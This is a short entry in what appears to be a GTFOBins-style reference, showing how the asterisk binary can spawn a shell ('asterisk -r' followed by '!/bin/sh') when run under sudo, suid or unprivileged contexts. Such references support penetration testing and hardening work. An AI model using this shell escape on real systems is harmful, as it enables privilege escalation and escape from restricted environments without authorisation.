---
type: gtfobin
name: asterisk
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# asterisk

## shell

```bash
asterisk -r
!/bin/sh
```
_A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket._
**Contexts:** sudo, suid, unprivileged
